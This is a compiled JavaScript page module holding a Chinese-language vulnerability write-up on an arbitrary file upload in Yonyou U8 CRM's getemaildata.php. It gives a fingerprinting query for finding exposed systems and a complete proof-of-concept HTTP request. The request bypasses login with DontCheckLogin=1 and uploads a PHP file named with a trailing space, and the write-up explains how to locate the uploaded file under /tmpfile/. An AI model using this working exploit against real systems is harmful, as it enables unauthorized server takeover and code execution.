import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 U8 CRM客户关系管理系统 getemaildata.php 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器权限，攻击服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>用友 U8 CRM客户关系管理系统</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>web.body=&quot;用友U8CRM&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828151026882.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ

------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php &quot;
Content-Type: text/plain

&lt;?php phpinfo();?&gt;

------WebKitFormBoundarykS5RKgl8t3nwInMQ
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828151040826.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问文件，文件名需要十六进制减一</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/tmpfile/updD24D.tmp.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,14),r=[d];function l(s,o){return a(),i("div",null,r)}const u=e(t,[["render",l],["__file","用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞.html.vue"]]);export{u as default};
